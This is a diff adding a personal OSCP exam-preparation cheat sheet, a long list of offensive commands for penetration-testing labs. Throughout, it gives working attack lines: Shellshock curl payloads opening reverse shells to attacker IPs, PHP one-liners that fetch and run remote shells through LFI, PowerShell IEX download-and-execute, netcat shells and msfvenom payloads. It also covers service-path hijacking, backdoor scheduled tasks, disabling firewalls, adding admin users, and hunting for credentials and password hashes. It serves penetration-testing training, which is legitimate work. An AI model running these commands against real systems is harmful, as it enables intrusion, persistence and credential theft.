@@ -1,0 +1,1311 @@
+This file conains all the notes i did during my preparation for the OSCP exam.
+<gamma@thc.org>
+
+=================
+
+
+START FTPD: /etc/init.d/vsftpd start
+
+
+make dirtycow stable
+echo 0 > /proc/sys/vm/dirty_writeback_centisecs
+
+SHELLSHOCK
+==========
+curl -H 'User-Agent: () { :; }; echo "CVE-2014-6271 vulnerable" bash -c id' http://10.11.1.71/cgi-bin/admin.cgi
+
+nmap 10.11.1.71 -p 80 \
+  --script=http-shellshock \
+  --script-args uri=/cgi-bin/test.cgi --script-args uri=/cgi-bin/admin.cgi
+
+./shocker.py -H TARGET --command "/bin/cat /etc/passwd" -c /cgi-bin/status --verbose
+
+* Shellshock via SSH
+ssh -vvv
+ssh -i noob noob@$ip '() { :;}; /bin/bash'
+
+* cat file (view file contents)
+
+echo -e "HEAD /cgi-bin/status HTTP/1.1\\r\\nUser-Agent: () {:;}; echo \\$(</etc/passwd)\\r\\nHost:vulnerable\\r\\nConnection: close\\r\\n\\r\\n" | nc TARGET 80
+       
+curl -H "User-Agent: () { ignored;};/bin/bash -i >& /dev/tcp/192.168.178.102/9999 0>&1" "http://192.168.178.121:80/cgi-bin/status/"
+ 
+* Shellshock run bind shell using netcat
+
+echo -e "HEAD /cgi-bin/status HTTP/1.1\\r\\nUser-Agent: () {:;}; /usr/bin/nc -l -p 9999 -e /bin/sh\\r\\nHost:vulnerable\\r\\nConnection: close\\r\\n\\r\\n" | nc TARGET 80
+
+
+FTP BOUNCE
+==========
+-> use ftp bounce attack on 10.11.1.125A to scan ports on 10.11.1.125B
+nmap -vvvv -P0 -n -b 10.11.1.125A 10.11.1.125B  -p-
+
+Portscan Netcat
+===============
+nc -nvv -w 1 -z $ip 3388-3390
+
+
+Temporary Web Server
+===================
+python -m SimpleHTTPServer
+python3 -m http.server
+ruby -rwebrick -e "WEBrick::HTTPServer.new(:Port => 8888, :DocumentRoot => Dir.pwd).start"
+php -S 0.0.0.0:8888
+
+
+WEB ENUMERATION
+============
+* URL Enumeration
+gobuster -u http://10.11.1.71/ \
+  -w /usr/share/seclists/Discovery/Web_Content/common.txt \
+  -s '200,204,301,302,307,403,500' -e
+
+-s string
+	Positive status codes (dir mode only) (default "200,204,301,302,307)
+if every non existing ULR gives 200 "Try again you N000b"
+remove 200 from -s 
+
+-x for file-extension
+-x asp
+
+ gobuster -u http://10.11.1.71/   -w /usr/share/seclists/Discovery/Web_Content/cgis.txt   -s '200,204,301,302,307,403,500' -e
+
+uniscan -qweds -u <http://vm/>
+
+
+REVERSE SHELL
+=============
+* Shellshock
+curl -H "User-Agent: () { :; }; /bin/bash -c 'echo aaaa; bash -i >& /dev/tcp/10.11.0.192/443 0>&1; echo zzzz;'"   http://10.11.1.71/cgi-bin/admin.cgi -s | sed -n '/aaaa/{:a;n;/zzzz/b;p;ba}'
+
+
+METASPLOIT
+==========
+* start up postgresql
+systemctl start postgresql
+* start up msfdb
+msfdb start
+* start up msf
+msfconsole -q
+msf > db_status
+[ *] postgresql connected to msf
+msf >
+
+searchsploit drupal
+searchsploit -x filepath
+
+copy to clipboard the exploit:
+searchsploit -p filepath   
+
+meterpreter reverse shell
+set payload windows/meterpreter/reverse_tcp
+
+PHP Exploitton through LFI
+==========================
+* Check for LFI Linux:
+http://10.11.1.116/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../..//var/log/httpd-error.log
+
+PHP Session Path
+/var/tmp/sess_
+/tmp/sess_
+
+* Check for LFI Windows:
+page=../../../../../../windows/system32/drivers/etc/hosts 
+
+cp /opt/powershell/nishang/Shells/Invoke-PowerShellTcp.ps1 shell-9001.ps1
+at bottem:
+Invoke-PowerShellTcp -Reverse -IPAddress 10.10.0.192 -Port 4444
+copy shell-9001 to local web root
+<?php system($_REQUEST['PleaseSubscribe']);>
+<?php system($_REQUEST['cmd']);>
+?PleaseSubscribe="PowerShell IEX(New-Object Net.WebClient).downloadString('http://10.10.0.192/shell-9001.ps1')"
+-> IEX download and execute
+on a windows 64 machine eplace powershell with
+C:\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe
+
+press CTRL-u for URL code string in burp
+
+- upload to a file this:
+-> will download shell to /tmp/ and execute
+<?php system("cd /tmp; /usr/local/bin/wget http://10.11.0.192/shell; chmod +x shell; ./shell"); ?>
+
+=> download php-serverse-shell rev.php and copy to dir where rev.php can executed via LFI
+<?php system("cd /tmp; /usr/local/bin/wget http://10.11.0.192/c99.php; cp c99.php /usr/local/database/c99.php; "); ?>
+<?php system("cd /tmp; /usr/local/bin/wget http://10.11.0.192/rev.php; cp rev.php /usr/local/database/rev.php; "); ?>
+<?php system("cd /tmp; /usr/local/bin/wget http://10.11.0.192/rev.php; php /tmp/rev.php "); ?>
+... this is good when u can not cp into the www-root 
+.. also one only knows www-root-path by LFI
+
+=> put a remote file into web-root/myshell from http://10.11.0.192/shell.txt 
+<?php function dl($u, $o){$c = file_get_contents($u);file_put_contents($o,$c);}dl("http://10.11.0.192/shell.txt",realpath(realpath(dirname(__FILE__)))."/myshell.php")?>
+
+Windows Exploitation through ASP FILE UPLOAD
+============================================
+* Creating ASP Reverse Meterpreter Shell with msfvenom:
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f asp >reverse.asp
+
+msfvenom -l | grep windows
+
+* start meterpreter handler in msfconsole
+use exploit/multi/handler
+msf exploit(handler) > set PAYLOAD windows/meterpreter/reverse_tcp
+PAYLOAD => windows/meterpreter/reverse_tcp
+msf exploit(handler) > set LHOST 10.11.0.192
+LHOST => 10.11.0.192
+msf exploit(handler) > set LPORT 4444
+LPORT => 4444
+msf exploit(handler) > set ExitOnSession false
+ExitOnSession => false
+msf exploit(handler) > exploit -j
+
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 10.11.0.192
+set LPORT 4444
+set ExitOnSession false
+exploit -j
+
+msf-> session -i 1
+
+Meterpreter Reverse Shellcode
+=============================
+msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp -e x86/alpha_mixed LHOST=10.11.0.192 LPORT=4444 -f python > shell.py
+
+Windows Priviledge escalation Cheatset
+=======================================
+* Determine Service Pack
+	Window 2008:
+	systeminfo
+	OS Version: 6.1.760 N/A Build 7600
+	OS Version: 6.1.760 Service Pack 1 Build 7600
+	Hotfix(s):	N/A
+
+
+	Windows XP:
+	type C:\Windows/system32\eula.txt
+	type C:\Windows\System32\license.rtf
+
+* Hotfixes installed
+dir C:\Windows\SoftwareDistribution\Download\*.* /s
+type C:\Windows\WindowsUpdate.log
+
+
+* List all Documents of all Users
+dir /b /ad "C:\Documents and Settings\" /s
+
+* get current windows version
+type C:/Windows/system32/eula.txt
+
+* current priviledges
+whoami /priv	Privileges associated with your account
+whoami	Get current username
+
+* Other logged in Users
+qwinsta
+
+* Users on the system
+net user
+
+* Groups on the system
+net localgroup
+
+* Members of a group
+net localgroup "Remote Desktop Users"
+
+* Change password for user Bob
+net user Bob *
+
+* Create a user
+net user /add [username] [password]
+net user /add gamma gamma
+
+
+* Run cmd.exe as Administrator
+runas /savecred /user:administrator cmd
+
+*  to Obtain the names of a service.
+Syntax: sc query [service name]
+Example: sc query wuauserv
+
+sc query state= all
+
+get all non-windows services:
+wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """
+-> than check with icacls the permissions of the executeables
+-> vulnerable like Everyone:(I)(F)
+
+* Running Tasks
+tasklist
+
+* Kill a task
+taskkill f /pid 7777
+taskkill /f /im "Taskmgr.ex"
+
+* start or stop a service
+sc start
+sc stop
+
+* run command through smb when user/password is known
+smbexec.py  THINC/gamma:"mypassword"@10.11.118^C
+
+* snmp configuration
+reg query HKLM\SYSTEM\CurrentControlSet\Services\SNMP /s
+
+* UnQuoted Service Paths
+wmic service get name,displayname,pathname,startmode 2>nul |findstr /i "Auto" 2>nul |findstr /i /v "C:\Windows\\" 2>nul |findstr /i /v """
+
+* Permissions
+icacls “C:\Example”	Print permissions for “Example” directory
+accesschk.exe -qwsu “Group”	Objects modifyable by “Group” (try “Everyone”, “Authenticated Users”, and/or “Users”)
+
+accesschk.exe -qwsu “Group”	Objects modifyable by “Group” (try “Everyone”, “Authenticated Users”, and/or “Users”)
+
+* Find all weak folder permissions per drive.
+
+ accesschk.exe -uwdqs Users c:\
+ accesschk.exe -uwdqs "Authenticated Users" c:\
+accesschk64.exe -uwdqs Users c:\*.*
+
+* Find all weak file permissions per drive.
+
+ accesschk.exe -uwqs Users c:\*.*
+ accesschk.exe -uwqs "Authenticated Users" c:\*.*
+ accesschk64.exe -uwqs Users c:\*.*
+ accesschk64.exe -uwqs "Authenticated Users" c:\*.*
+
+* Permissions to services
+ accesschk.exe -ucqv *
+accesschk64.exe -ucqv *
+accesschk.exe -cuwv "user" *
+
+accesschk.exe -uwcqv "Authenticated Users" * /accepteula
+SERVICE_ALL_ACCESS means we have full control over modifying the properties of the PFNet Service
+
+Find weak service:
+C:\Users\Public\ccesschk.exe -cuwv "user" * 
+Start Type is AUTO_START
+sc cong blackwinterSrv binpath= "C:\temp_dir\nc.exe -nv 192.168.168.168 443 -e C:\WINDOWS\System32\cmd.exe"
+
+* To see all global objects that Everyone can modify:
+
+ accesschk -wuo everyone \basednamedobjects
+ accesschk64 -wuo everyone \basednamedobjects
+
+
+* See system log
+wevtutil cl System
+
+* XP: add user to adminustayorf group
+net localgroup Administrators Bob  /add
+
+* find scheduled tasks
+schtasks /query /fo LIST /v
+Scheduled Tasks
+Here we are looking for tasks that are run by a privileged user, and run a binary that we can overwrite.
+schtasks /query /fo LIST /v
+This might produce a huge amount of text. I have not been able to figure out how to just output the relevant strings with findstr. So if you know a better way please notify me. As for now I just copy-paste the text and past it into my linux-terminal.
+Yeah I know this ain't pretty, but it works. You can of course change the name SYSTEM to another privileged user.
+cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
+
+Task scheduled to run when RDP login fails:
+SchTasks /Create /RU SYSTEM /SC ONEVENT /MO "*[System[EventID=4625]] and *[EventData[Data='USERNAME_BACKDOOR']]" /EC Security /TN "RDPBackdoor" /TR "C:\PAYLOAD.EXE" /F
+
+schtasks /create /tn "SystemTask" /tr "cmd /C 'PAYLOAD.EXE'" /rl HIGHEST /ru SYSTEM /sc ONSTART
+/tn specifies the name of the task
+/tr specifies the command to run
+/rl specifies run level. I don’t think this is related to Unix run levels, but is instead a privilege thing
+/ru the user the payload is run under.
+/sc is the frequency. we want it to run when the machine starts up.
+
+
+
+
+* list all servics
+sc query
+
+* As Admin, create a user that is allowed to use Rdesktop
+net user /add gamma gamma 
+net localgroup "Remote Desktop Users" gamma /add
+net localgroup Administrators gamma /add
+net localgroup "Backup Operators" gamma /add
+
+
+* Search for interesting files
+dir sysprep.inf /s
+dir sysprep.xml /s
+dir Unattended.xml /s
+dir *.zip /s
+dir *.7z /s
+findstr /si pass *.xml *.ini *.txt *.config *.cfg *.bat
+findstr /si pwd *.xml *.ini *.txt *.config *.cfg *.bat
+dir /s *pass* == *cred* == *vnc* == *.config*
+dir C:\*vnc.ini /s /b /c
+dir C:\ /s /b /c | findstr /sr \*password\*
+dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
+findstr /si password *.xml *.ini *.txt *.config 2>nul
+
+* Query registry
+reg query HKLM /f password /t REG_SZ /s
+reg query HKLM /f pass /t REG_SZ /s
+reg query HKLM /f pwd /t REG_SZ /s
+reg query HKCU /f password /t REG_SZ /s
+
+* Check Credential Store for saved/chached Passwords
+cmdkey.exe /list
+runas /profile /savecred /user:Administrator <full path of executeable>
+
+dir C:\Users\username\AppData\Local\Microsoft\Credentials\
+dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
+
+
+* Check if InstallAlwaysElevated
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+
+msfvemom -f msi -p windows/meterpreter/reverse_tcp
+msfvenom -p windows/adduser USER=rottenadmin PASS=xxx -f msi -o rotten.msi
+msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\rotten.msi
+
+vulnerable if following output:
+HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer
+    AlwaysInstallElevated    REG_DWORD    0x1
+A malicious .msi file can be created using msfvenom. Choose a desired payload and set use the -f msi flag to set the output format to MSI.
+
+Then the payload can be executed on the vulnerable system using msiexec.
+
+* Check for Unattended install
+
+dir C:\Windows\Panther\
+dir C:\Windows\Panther\Unattend\
+dir C:\Windows\System32\
+dir C:\Windows\System32\sysprep\
+dir c:\Unattended.xml /s
+dir c:\sysprep.xml /s
+dir c:\sysprep.inf /s
+
+
+
+* DLL Highjacking
+
+
+
+* PowerSploit
+
+* Unquoted Service Path
+
+wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """
+
+ The path for PFNet’s service binary is unquoted and contains spaces. 
+
+Metasploit Module:  exploit/windows/local/trusted_service_path
+
+* Unattented Installs
+https://toshellandback.com/2015/11/24/ms-priv-esc/
+-> installations without user interactions containing credentials:
+
+dir c:\Unattend.xml /s
+dir c:\sysprep.xml  /s
+dir c:\sysprep.inf /s
+
+* VNC Password location
+RealVNC
+HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\vncserver
+Value: Password
+
+Cracking:
+root@kali:~/scripts/bruteforce# ./vncpwd/vncpwd /root/vnc_pwd 
+
+
+TightVNC
+C:\>reg query HKEY_LOCAL_MACHINE\Software\TightVNC\Server /v Password
+
+HKEY_LOCAL_MACHINE\Software\TightVNC\Server
+    Password    REG_BINARY    2151D3722874AD0C
+
+HKEY_CURRENT_USER\Software\TightVNC\Server
+Value: Password or PasswordViewOnly
+TigerVNC
+HKEY_LOCAL_USER\Software\TigerVNC\WinVNC4
+Value: Password
+UltraVNC
+C:\Program Files\UltraVNC\ultravnc.ini
+Value: passwd or passwd2
+Read More: https://www.raymond.cc/blog/crack-or-decrypt-vnc-server-encrypted-password/
+
+
+* Basic Commands
+systeminfo | findstr /B /C:”OS Name” /C:”OS Version”
+hostname
+echo %username%
+net users
+net user user1
+
+* Windows Firewall
+Show Config: netsh firewall show config
+allow port 3389: netsh firewall add portopening protocol=TCP name=3389 port=3389 mode=ENABLE
+Turn Off:
+$ netsh firewall set opmode disable
+netsh advfirewall set currentprofile state off
+
+
+* Enable RDP
+Enabling RDP
+netsh firewall set service RemoteDesktop enable
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurentControlSet\Control\Terminal Server" /v fDenyTSConnections /t 
+REG_DWORD /d 0 /f
+reg add "hklm\system\currentControlSet\Control\Terminal Server" /v "AllowTSConnections" /t REG_DWORD /d 0x1 /f
+sc config TermService start= auto
+net start Termservice
+netsh.exe
+firewall
+add portopening TCP 3389 "Remote Desktop"
+OR: 
+netsh.exe advfirewall firewall add rule name="Remote Desktop - User Mode (TCP-In)" dir=in action=allow 
+program="%%SystemRoot%%\system32\svchost.exe" service="TermService" description="Inbound rule for the 
+Remote Desktop service to allow RDP traffic. [TCP 3389] added by LogicDaemon's script" enable=yes 
+profile=private,domain localport=3389 protocol=tcp
+netsh.exe advfirewall firewall add rule name="Remote Desktop - User Mode (UDP-In)" dir=in action=allow 
+program="%%SystemRoot%%\system32\svchost.exe" service="TermService" description="Inbound rule for the 
+Remote Desktop service to allow RDP traffic. [UDP 3389] added by LogicDaemon's script" enable=yes 
+profile=private,domain localport=3389 protocol=udp
+OR (meterpreter) 
+run post/windows/manage/enable_rdp
+
+---
+* Enable RDP access
+
+reg add "hklm\system\currentcontrolset\control\terminal server" /f /v fDenyTSConnections /t REG_DWORD /d 0
+netsh firewall set service remoteadmin enable
+netsh firewall set service remotedesktop enable
+
+
+
+
+* Neighbours
+ipconfig /displaydns	Shows DNS cache
+netsh route print	Print routing table
+
+* WinXP dump hahes
+reg.exe save HKLM\SAM sam
+reg.exe save HKLM\SYSTEM sys
+samdump2 sys sam
+
+reg.exe save hklm\system c:\temp\system.save
+secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
+
+* view registry / ntuser.dat
+fred
+
+* upload files via ftp: (must be anon axxs)
+echo open 10.11.0.192 > ftp.txt
+@echo ftp>> ftp.txt
+@echo ftp>> ftp.txt
+@echo binary>> ftp.txt
+@echo GET /nc.exe>> ftp.txt
+echo quit >>ftp.txt
+ftp -s:ftp.txt -v
+
+* Download from HTTP via Powershell one-liner
+(New-Object System.Net.WebClient).DownloadFile(“http://host/file”,”C:\LocalPath”)	PowerShell one-liner download a remote file to LocalPath
+
+Invoke-WebRequest "https://myserver/filename" -OutFile "C:\Windows\Temp\filename"
+(New-Object System.Net.WebClient).DownloadFile("https://myserver/filename", "C:\Windows\Temp\filename") 
+
+echo $webclient = New-Object System.Net.WebClient >>wget.ps1
+echo $url = "http://10.11.0.192/MS11-040.exe" >>wget.ps1
+echo $file = "output-file.exe" >>wget.ps1
+echo $webclient.DownloadFile($url,$file) >>wget.ps1
+powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
+
+
+$secpasswd = ConvertTo-SecureString "aliceishere" -AsPlainText -Force
+$mycreds = New-Object System.Management.Automation.PSCredential ("alice", $secpasswd)
+$computer = "10.11.1.49"
+[System.Diagnostics.Process]::Start("C:\Users\Public\nc","-e c:\windows\system32\cmd.exe 10.11.0.192 9999", $mycreds.Username, mycreds.Password, $computer)
+
+powershell.exe -ExecutionPolicy Bypass -NoLogo -NoProfile -File wget.ps1
+
+* windows wget alternative
+echo Set args = Wscript.Arguments  >> webdl.vbs
+timeout 1
+echo Url = "http://1.1.1.1/windows-privesc-check2.exe"  >> webdl.vbs
+timeout 1
+echo dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")  >> webdl.vbs
+timeout 1
+echo dim bStrm: Set bStrm = createobject("Adodb.Stream")  >> webdl.vbs
+timeout 1
+echo xHttp.Open "GET", Url, False  >> webdl.vbs
+timeout 1
+echo xHttp.Send  >> webdl.vbs
+timeout 1
+echo with bStrm      >> webdl.vbs
+timeout 1
+echo 	.type = 1 '      >> webdl.vbs
+timeout 1
+echo 	.open      >> webdl.vbs
+timeout 1
+echo 	.write xHttp.responseBody      >> webdl.vbs
+timeout 1
+echo 	.savetofile "C:\temp\windows-privesc-check2.exe", 2 '  >> webdl.vbs
+timeout 1
+echo end with >> webdl.vbs
+timeout 1
+echo
+
+    The file can be run using the following syntax:
+
+    C:\temp\cscript.exe webdl.vbs
+
+
+
+* Transfer via SMB
+python /usr/local/bin/smbserver.py ROPNOP /oscp/exploit/windows/ms11-046/
+impacket-smbserver ROPNOP /oscp/exploit/windows/ms11-046/
+copy \\10.11.0.192\ROPNOP\MS11-040.exe
+\\10.11.0.192\ROPNOP\MS11-040.exe
+
+* Transfer via Webdav
+/root/webdav_start.sh
+net use x: http://10.11.0.192/
+
+* Transfer via Certutil
+certutil.exe -URL http://10.11.0.192/foobar
+foobar is in C:\Users\subTee\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content
+
+* tunnel only local reachable ports
+plink.exe -v -pw mypassword gamma@10.11.0.192 -L 6666:127.0.0.1:445
+
+Wir bauen einen SSH Tunnel um den MySQL zu erreichen.
+Wir müssen also über SSH einen Tunnel für Port 3306 schaffen. Dazu bauen wir eine SSH Verbindung zu 1.2.3.4 auf und Tunneln Port 3306.
+
+plink.exe -v -pw geheim nutzername@1.2.3.4 -L 6603:localhost:3306
+
+* Compiling C windows exploits on Linux
+> i686-w64-mingw32-gcc exploit.c -o exploit #64 Bit > i686-w64-mingw32-gcc 40564.c -o 40564 -lws2_32 #32 Bit
+
+
+
+* Windows LOOTING
+https://tools.kali.org/password-attacks/creddump
+
+* Run Powershell scripts
+MS16-032 https://www.exploit-db.com/exploits/39719/
+
+    powershell -ExecutionPolicy ByPass -command "& { . C:\Users\Public\Invoke-MS16-032.ps1; Invoke-MS16-032 }"
+
+powershell -ExecutionPolicy ByPass -command "& { . C:\Users\Bethany\AppData\Local\Temp\Invoke-MS16-032.ps1; Invoke-MS16-032 }"
+
+* Windows compile python to .exe
+net use z: \\tsclient\test 
+
+code in /root/rdesktopshare
+
+C:\Users\Administrator\Desktop\Tools\python\pyinstaller-2.1\pyInstaller-2.1
+C:\Users\Administrator\Desktop\Tools\python\pyinstaller-2.1\pyInstaller-2.1>c:\Python27\python.exe pyinstaller.py --onefile z:\ms14-058.py
+
+wine ~/.wine/drive_c/Python27/Scripts/pyinstaller.exe --onefile HelloWorld.py
+
+
+
+* Powershell RunAS
+
+working:
+echo $username = 'ftp' > runas.ps1
+echo $securePassword = ConvertTo-SecureString "foobar23" -AsPlainText -Force  >> runas.ps1
+echo $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword >> runas.ps1
+echo $script = 'c:\windows\system32\cmd.exe' >> runas.ps1
+echo Start-Process -WorkingDirectory 'C:\Windows\System32' -FilePath $script  -Credential $credential  >> runas.ps1
+powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File runas.ps1
+
+
+* Powershell reverse Netcat shell in C:\Users\Public\nc.exe with user ftp/foobar23
+
+echo $username = 'ftp' > rev.ps1
+echo $securePassword = ConvertTo-SecureString "foobar23" -AsPlainText -Force  >> rev.ps1
+echo $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword >> rev.ps1
+echo $script= 'C:\Users\Public\nc.exe' >> rev.ps1
+echo Start-Process -WorkingDirectory 'C:\Users\Public\' -FilePath $script  -ArgumentList ‘-e cmd.exe 10.11.0.192 9999’ -Credential $credential  >> rev.ps1
+
+
+echo $username = 'alice' > runas.ps1
+echo $securePassword = ConvertTo-SecureString "aliceishere" -AsPlainText -Force >> runas.ps1
+echo $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword >> runas.ps1
+echo Start-Process C:\Windows\System32\cmd.exe  -Credential $credential >> runas.ps1
+
+
+
+
+Using Powershell to RunAs an administrative user:
+echo $secpasswd = ConvertTo-SecureString "password" -AsPlainText -Force > run.ps1
+echo $mycreds = New-Object System.Management.Automation.PSCredential ("admin", $secpasswd) >> run.ps1
+echo $computer = "DANCING-PARROT" >> run.ps1
+echo [System.Diagnostics.Process]::Start("C:\xampp\webdav\rev.exe","", >> run.ps1
+echo $mycreds.Username, $mycreds.Password, $computer) >> run.ps1
+powershell -ExecutionPolicy Bypass -File run.ps1
+
+
+
+echo $username = ‘alice‘ > startprocess.ps1
+echo $password = ‘aliceishere‘ >> startprocess.ps1
+echo $securePassword = ConvertTo-SecureString $password -AsPlainText -Force >> startprocess.ps1
+echo $credential = New-Object System.Management.Automation.PSCredential $username, $securepassword >> startprocess.ps1
+echo Start-Process ‘C:\Users\Public\nc.exe’ -ArgumentList ‘-e cmd.exe 10.11.0.192 9999’ -Credential $credential >> startprocess.ps1
+
+
+* Windows helpers
+
+useradd.c
+
+* Windows - Add user.
+
+#include <stdlib.h> /* system, NULL, EXIT_FAILURE */
+
+int main ()
+{
+  int i;
+  i=system ("net user <username> <password> /add && net localgroup administrators <username> /add");
+  return 0;
+}
+
+# Compile
+i686-w64-mingw32-gcc -o useradd.exe useradd.c
+SUID
+
+* Set owner user ID.
+
+int main(void){
+  setresuid(0, 0, 0);
+  system("/bin/bash");
+}
+
+# Compile
+gcc suid.c -o suid
+Powershell Run as
+
+* Run file as another user with powershell.
+
+echo $username = '<username>' > runas.ps1
+echo $securePassword = ConvertTo-SecureString "<password>" -AsPlainText -Force >> runas.ps1
+echo $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword >> runas.ps1
+echo Start-Process C:\Users\User\AppData\Local\Temp\backdoor.exe -Credential $credential >> runas.ps1
+Process Monitor
+
+* Monitor processes to check for running cron jobs.
+
+#!/bin/bash
+
+# Loop by line
+IFS=$'\n'
+
+old_process=$(ps -eo command)
+
+while true; do
+	new_process=$(ps -eo command)
+	diff <(echo "$old_process") <(echo "$new_process") | grep [\<\>]
+	sleep 1
+	old_process=$new_process
+done
+
+* Powershell Empire
+in empire:
+listeners
+uselistener http
+set Host http://10.10.14.30:443
+set Port 443
+execute
+launcher powershell
+copy output to a file empire.ps1 serving on local apache
+
+in burp:
+.. downloadString('.../empire.ps1
+
+in empire:
+interact agentid
+searchmode PowerUp
+usermodule privesc/powerup/allchecks
+info
+execute
+
+* PowerUp.ps1
+add the end: Invoke-AllChecks
+
+when having code execution via .asp/.php/...
+?fexec = echo "IEX(New-Object Net.WebClient).DownloadString('http://myip/PowerUp.ps') | powershell -noprofile -
+
+
+* Sherlock
+Sherlock.ps1
+grep -i function Sherlock.ps1
+Find-AllVulns
+at the end append: Find-AllVulns
+
+
+* Check if OS is 64bit
+Powershell.exe
+[environment]::Is64BitOperatingSystem
+
+* Check if current process is a 64bit Process
+[environment]::Is64BitProcess
+
+Directories
+SysWOW64 64bit Applictions available to 32bit Applications through emulation
+SysNative -> 64bit processes live here
+
+* when running 32bit app on a 64bit OS
+Powershell.exe -> C:\Windows\SysNative\WindowsPowerShell\v1.0\Powershell
+
+WIN XP SP0/SP1 local priviledge escalation
+================================
+sc config upnphost binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
+
+sc config upnphost obj= ".\LocalSystem" password= ""
+sc qc upnphost
+nc -lvp 9988
+net start upnphost
+
+   #list properties
+            sc qc "Vulnerable Service"
+        # check privileges
+            sc qprivs "Service name"
+
+net user /add gamma gamma
+sc config upnphost binpath= "C:\Inetpub\wwwroot\nc.exe 192.168.1.101 6666 -e c:\Windows\system32\cmd.exe"
+sc config upnphost binpath= "C:\Inetpub\wwwroot\nc.exe 10.11.0.192 6666 -e C:\WINDOWS\System32\cmd.exe"
+sc config upnphost obj= ".\LocalSystem" password= ""
+sc config upnphost depend= ""
+
+LINUX PRIVILEDGE ESCALATION
+===========================
+
+* What files run as root / SUID / GUID?:
+
+find / -perm +2000 -user root -type f -print
+find / -perm -1000 -type d 2>/dev/null   # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here.
+find / -perm -g=s -type f 2>/dev/null    # SGID (chmod 2000) - run as the group, not the user who started it.
+find / -perm -u=s -type f 2>/dev/null    # SUID (chmod 4000) - run as the owner, not the user who started it.
+find / -perm -g=s -o -perm -u=s -type f 2>/dev/null    # SGID or SUID
+
+for i in `locate -r "bin$"`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null; done
+
+find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null
+
+*    What folders are world writeable?:
+
+find / -writable -type d 2>/dev/null      # world-writeable folders
+find / -perm -222 -type d 2>/dev/null     # world-writeable folders
+find / -perm -o w -type d 2>/dev/null     # world-writeable folders
+find / -perm -o x -type d 2>/dev/null     # world-executable folders
+find / \( -perm -o w -perm -o x \) -type d 2>/dev/null   # world-writeable & executable folders
+
+
+SHELL SPAWNING
+==============
+python -c 'import pty; pty.spawn("/bin/sh")'
+CTRL-Z
+stty raw -echo
+fg
+stty size
+stty -rows 48 -columns 120
+
+echo os.system('/bin/bash')
+/bin/sh -i
+perl —e 'exec "/bin/sh";'
+perl: exec "/bin/sh";
+ruby: exec "/bin/sh"
+lua: os.execute('/bin/sh')
+(From within IRB)
+exec "/bin/sh"
+(From within vi)
+:!bash
+(From within vi)
+:set shell=/bin/bash:shell
+(From within nmap)
+!sh
+(from man page)
+!/bin/sh
+
+Interesting Fils for Dirbuster Bruteforcing:
+==============
+mbox.bz2
+mbox
+
+WWW Directory enumeration
+--------------------------
+dirb http://10.11.1.72 /usr/share/wordlists/dirb/small.txt  -x extensions_common.txt
+
+based on Web Application:
+/usr/share/seclists/Discovery/Web-Content
+
+
+Windows SMB enumeration
+-----------------------
+* enum4linux -a <host~
+
+* ms08-67
+nmap -sU -sS --script smb-vuln-ms08-067.nse -p U:137,T:139 10.11.1.5
+
+* os detection
+nmap -v -p 139, 445 --script=smb-os-discovery 10.11.1.227
+
+* smb security mode
+nmap -v -p 139, 445 --script=smb-security-mode 10.11.1.236
+
+* some checks
+nmap -vvv -sU -sS --script smb-enum-users,smb-enum-shares,smb-os-discovery,smb-protocols,smb-security-mode,smb-system-info,smb2-capabilities,smb2-security-mode,smb-vuln-ms08-067,smb-vuln-ms10-054,smb-vuln-ms10-061 –script-args=unsafe=1 -p U:1^C,T:139 10.11.1.5
+
+ SMB Enumeration
+
+        SMB OS Discovery
+        nmap $ip --script smb-os-discovery.nse
+
+        Nmap port scan
+        nmap -v -p 139,445 -oG smb.txt $ip-254
+
+        Netbios Information Scanning
+        nbtscan -r $ip/24
+
+        Nmap find exposed Netbios servers
+        nmap -sU --script nbstat.nse -p 137 $ip
+
+        Nmap all SMB scripts scan
+
+        nmap -sV -Pn -vv -p 445 --script='(smb*) and not (brute or broadcast or dos or external or fuzzer)' --script-args=unsafe=1 $ip
+
+        Nmap all SMB scripts authenticated scan
+
+        nmap -sV -Pn -vv -p 445 --script-args smbuser=<username>,smbpass=<password> --script='(smb*) and not (brute or broadcast or dos or external or fuzzer)' --script-args=unsafe=1 $ip
+
+        SMB Enumeration Tools
+        nmblookup -A $ip
+
+        smbclient //MOUNT/share -I $ip -N
+
+        rpcclient -U "" $ip
+
+        enum4linux $ip
+
+        enum4linux -a $ip
+
+        SMB Finger Printing
+        smbclient -L //$ip
+
+        Nmap Scan for Open SMB Shares
+        nmap -T4 -v -oA shares --script smb-enum-shares --script-args smbuser=username,smbpass=password -p445 192.168.10.0/24
+
+        Nmap scans for vulnerable SMB Servers
+        nmap -v -p 445 --script=smb-check-vulns --script-args=unsafe=1 $ip
+
